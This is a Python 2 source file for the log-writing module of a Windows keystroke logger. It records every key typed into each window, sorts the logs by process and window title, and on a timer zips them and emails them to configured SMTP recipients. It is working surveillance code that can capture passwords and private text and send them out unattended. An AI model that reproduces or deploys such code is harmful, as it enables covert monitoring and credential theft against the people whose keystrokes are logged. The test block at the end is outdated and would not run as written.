import win32api, win32con, win32process
import os, os.path
import time
import re
import sys

# needed for automatic timed recurring events
import mytimer

# the following are needed for zipping the logfiles
import zipfile
import zlib

# the following are needed for automatic emailing
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.Utils import COMMASPACE, formatdate
from email import Encoders

class LogWriter:
    '''Manages the writing of log files and logfile maintenance activities.
    '''
    def __init__(self, settings):
        
        self.settings = settings
        self.settings['dirname'] = os.path.normpath(self.settings['dirname'])
        
        try:
            os.makedirs(self.settings['dirname'], 0777) 
        except OSError, detail:
            if(detail.errno==17):  #if directory already exists, swallow the error
                pass
            else:
                self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
        except:
            self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
        
        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")      #regexp filter for the non-allowed characters in windows filenames.
        
        self.writeTarget = ""
        if self.settings['systemlog'] != 'None':
            try:
                self.systemlog = open(os.path.join(self.settings['dirname'], self.settings['systemlog']), 'a')
            except OSError, detail:
                if(detail.errno==17):  #if file already exists, swallow the error
                    pass
                else:
                    self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
            except:
                self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
        
        # initialize self.log to None, so that we dont attempt to flush it until it exists
        self.log = None
        
        # Set up the subset of keys that we are going to log
        self.asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
        self.asciiSubset.extend(range(32,255))      #all normal printable chars
        
        if self.settings['parsebackspace'] == 'True':
            self.asciiSubset.remove(8)              #remove backspace from allowed chars if needed
        if self.settings['parseescape'] == 'True':
            self.asciiSubset.remove(27)             #remove escape from allowed chars if needed

        # initialize the automatic zip and email timer, if enabled in .ini
        if self.settings['smtpsendemail'] == 'True':
            self.emailtimer = mytimer.MyTimer(float(self.settings['emailinterval'])*60*60, 0, self.ZipAndEmailTimerAction)
            self.emailtimer.start()
        
        # initialize automatic old log deletion timer
        if self.settings['deleteoldlogs'] == 'True':
            self.oldlogtimer = mytimer.MyTimer(float(self.settings['agecheckinterval'])*60*60, 0, self.DeleteOldLogs)
            self.oldlogtimer.start()
        
        if self.settings['timestampenable'] == 'True':
            self.timestamptimer = mytimer.MyTimer(float(self.settings['timestampinterval'])*60, 0, self.WriteTimestamp)
            self.timestamptimer.start()
        
        # initialize the automatic log flushing timer
        self.flushtimer = mytimer.MyTimer(float(self.settings['flushinterval']), 0, self.FlushLogWriteBuffers, ["Flushing file write buffers due to timer\n"])
        self.flushtimer.start()

    def WriteToLogFile(self, event):
        '''Write keystroke specified in "event" object to logfile
        '''
        loggable = self.TestForNoLog(event)     # see if the program is in the no-log list.
                
        if not loggable:
            if self.settings['debug']: self.PrintDebug("not loggable, we are outta here\n")
            return
        
        if self.settings['debug']: self.PrintDebug("loggable, lets log it\n")
        
        loggable = self.OpenLogFile(event) #will return true if log file has been opened without problems
        
        if not loggable:
            self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
            return

        if event.Ascii in self.asciiSubset:
            self.PrintStuff(chr(event.Ascii))
        if event.Ascii == 13 and self.settings['addlinefeed'] == 'True':
            self.PrintStuff(chr(10))                 #add line feed after CR,if option is set
            
        #we translate all the special keys, such as arrows, backspace, into text strings for logging
        #exclude shift keys, because they are already represented (as capital letters/symbols)
        if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate backspace into text string, if option is set.
        if event.Ascii == 8 and self.settings['parsebackspace'] == 'True':
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate escape into text string, if option is set.
        if event.Ascii == 27 and self.settings['parseescape'] == True:
            self.PrintStuff('[KeyName:' + event.Key + ']')

        if event.Key == self.settings['flushkey']:
            self.FlushLogWriteBuffers("Flushing write buffers due to keyboard command\n")

    def TestForNoLog(self, event):
        '''This function returns False if the process name associated with an event
        is listed in the noLog option, and True otherwise.'''
        
        self.processName = self.GetProcessNameFromHwnd(event.Window)
        if self.settings['nolog'] != 'None':
            for path in self.settings['nolog'].split(';'):
                if os.stat(path) == os.stat(self.processName):    #we use os.stat instead of comparing strings due to multiple possible representations of a path
                    return False
        return True

    def FlushLogWriteBuffers(self, logstring=""):
        '''Flush the output buffers and print a message to systemlog or stdout
        '''
        self.PrintDebug(logstring)
        if self.log != None: self.log.flush()
        if self.settings['systemlog'] != 'None': self.systemlog.flush()

    def ZipLogFiles(self):
        '''Create a zip archive of all files in the log directory.
        '''
        self.FlushLogWriteBuffers("Flushing write buffers prior to zipping the logs\n")
        
        os.chdir(self.settings['dirname'])
        myzip = zipfile.ZipFile(self.settings['ziparchivename'], "w", zipfile.ZIP_DEFLATED)
        
        for root, dirs, files in os.walk(os.curdir):
            for fname in files:
                if fname != self.settings['ziparchivename']:
                    myzip.write(os.path.join(root,fname).split("\\",1)[1])
        
        myzip.close()
        myzip = zipfile.ZipFile(self.settings['ziparchivename'], "r", zipfile.ZIP_DEFLATED)
        if myzip.testzip() != None:
            self.PrintDebug("Warning: Zipfile did not pass check.\n")
        myzip.close()
        
    def SendZipByEmail(self):
        '''Send the zipped logfile archive by email, using mail settings specified in the .ini file
        '''
        # set up the message
        msg = MIMEMultipart()
        msg['From'] = self.settings['smtpfrom']
        msg['To'] = COMMASPACE.join(self.settings['smtpto'].split(";"))
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = self.settings['smtpsubject']

        msg.attach( MIMEText(self.settings['smtpmessagebody']) )

        for file in [os.path.join(self.settings['dirname'], self.settings['ziparchivename'])]:
            part = MIMEBase('application', "octet-stream")
            part.set_payload( open(file,"rb").read() )
            Encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="%s"'
                           % os.path.basename(file))
            msg.attach(part)

        # set up the server and send the message
        mysmtp = smtplib.SMTP(self.settings['smtpserver'])
        
        if self.settings['debug']: 
            mysmtp.set_debuglevel(1)
        if self.settings['smtpneedslogin'] == 'True':
            mysmtp.login(self.settings['smtpusername'],self.settings['smtppassword'])
        sendingresults=mysmtp.sendmail(self.settings['smtpfrom'], self.settings['smtpto'].split(";"), msg.as_string())
        self.PrintDebug("Email sending errors (if any): " + str(sendingresults) + "\n")
        mysmtp.quit()

    def ZipAndEmailTimerAction(self):
        '''This is a timer action function that zips the logs and sends them by email.
        '''
        self.PrintDebug("Sending mail to " + self.settings['smtpto'] + "\n")
        self.ZipLogFiles()
        self.SendZipByEmail()
    
    def OpenLogFile(self, event):
        '''Open the appropriate log file, depending on event properties and settings in .ini file.
        '''
        # if the "onefile" option is set, we don't that much to do:
        if self.settings['onefile'] != 'None':
            if self.writeTarget == "":
                self.writeTarget = os.path.join(os.path.normpath(self.settings['dirname']), os.path.normpath(self.settings['onefile']))
                try:
                    self.log = open(self.writeTarget, 'a')
                except OSError, detail:
                    if(detail.errno==17):  #if file already exists, swallow the error
                        pass
                    else:
                        self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
                        return False
                except:
                    self.PrintDebug("Unexpected error: " + str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
                    return False
                
                #write the timestamp upon opening the logfile
                if self.settings['timestampenable'] == 'True': self.WriteTimestamp()

                self.PrintDebug("writing to: " + self.writeTarget + "\n")
            return True

        # if "onefile" is not set, we start playing with the logfilenames:
        subDirName = self.filter.sub(r'__',self.processName)      #our subdirname is the full path of the process owning the hwnd, filtered.
        
        WindowName = self.filter.sub(r'__',str(event.WindowName))
        
        filename = time.strftime('%Y%m%d') + "_" + str(event.Window) + "_" + WindowName + ".txt"
        
        #make sure our filename plus path is not longer than 255 characters, as per filesystem limit.
        #filename = filename[0:200] + ".txt"     
        if len(os.path.join(self.settings['dirname'], subDirName, filename)) > 255:
            if len(os.path.join(self.settings['dirname'], subDirName)) > 250:
                self.PrintDebug("root log dir + subdirname is longer than 250. cannot log.")
                return False
            else:
                filename = filename[0:255-len(os.path.join(self.settings['dirname'], subDirName))-4] + ".txt"  
        

        #we have this writetarget conditional to make sure we dont keep opening and closing the log file when all inputs are going
        #into the same log file. so, when our new writetarget is the same as the previous one, we just write to the same 
        #already-opened file.
        if self.writeTarget != os.path.join(self.settings['dirname'], subDirName, filename): 
            if self.writeTarget != "":
                self.FlushLogWriteBuffers("flushing and closing old log\n")
                #~ self.PrintDebug("flushing and closing old log\n")
                #~ self.log.flush()
                self.log.close()
            self.writeTarget = os.path.join(self.settings['dirname'], subDirName, filename)
            self.PrintDebug("writeTarget:" + self.writeTarget + "\n")
            
            try:
                os.makedirs(os.path.join(self.settings['dirname'], subDirName), 0777)
            except OSError, detail:
                if(detail.errno==17):  #if directory already exists, swallow the error
                    pass
                else:
                    self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                    return False
            except:
                self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                return False

            try:
                self.log = open(self.writeTarget, 'a')
            except OSError, detail:
                if(detail.errno==17):  #if file already exists, swallow the error
                    pass
                else:
                    self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                    return False
            except:
                self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                return False
            
            #write the timestamp upon opening a new logfile
            if self.settings['timestampenable'] == 'True': self.WriteTimestamp()
        
        return True

    def PrintStuff(self, stuff):
        '''Write stuff to log, or to debug outputs.
        '''
        if not self.settings['debug'] and self.log != None:
            self.log.write(stuff)
        if self.settings['debug']:
            self.PrintDebug(stuff)

    def PrintDebug(self, stuff):
        '''Write stuff to console and/or systemlog.
        '''
        if self.settings['debug']:
            sys.stdout.write(stuff)
        if self.settings['systemlog'] != 'None':
            self.systemlog.write(stuff)

    def WriteTimestamp(self):
        self.PrintStuff("\n[" + time.asctime() + "]\n")

    def DeleteOldLogs(self):
        '''Walk the log directory tree and remove any logfiles older than maxlogage (as set in .ini).
        '''
        self.PrintDebug("Analyzing and removing old logfiles.\n")
        for root, dirs, files in os.walk(self.settings['dirname']):
            for fname in files:
                if time.time() - os.path.getmtime(os.path.join(root,fname)) > float(self.settings['maxlogage'])*24*60*60:
                    try:
                        os.remove(os.path.join(root,fname))
                    except:
                        self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
                    try:
                        os.rmdir(root)
                    except:
                        self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")

    def GetProcessNameFromHwnd(self, hwnd):
        '''Acquire the process name from the window handle for use in the log filename.
        '''
        threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
        
        # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
        
        mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
        procname = win32process.GetModuleFileNameEx(mypyproc, 0)
        return procname

    def stop(self):
        '''To exit cleanly, flush all write buffers, and stop all running timers.
        '''
        self.FlushLogWriteBuffers("Flushing buffers prior to exiting")
        self.flushtimer.cancel()
        if self.settings['smtpsendemail'] == 'True':
            self.emailtimer.cancel()
        if self.settings['deleteoldlogs'] == 'True':
            self.oldlogtimer.cancel()
        if self.settings['timestampenable'] == 'True':
            self.timestamptimer.cancel()

if __name__ == '__main__':
    #some testing code
    #put a real existing hwnd into event.Window to run test
    #this testing code is now really outdated and useless.
    lw = LogWriter()
    class Blank:
        pass
    event = Blank()
    event.Window = 264854
    event.WindowName = "Untitled - Notepad"
    event.Ascii = 65
    event.Key = 'A'
    options = Blank()
    options.parseBackspace = options.parseEscape = options.addLineFeed = options.debug = False
    options.flushKey = 'F11'
    lw.WriteToLogFile(event, options)
    
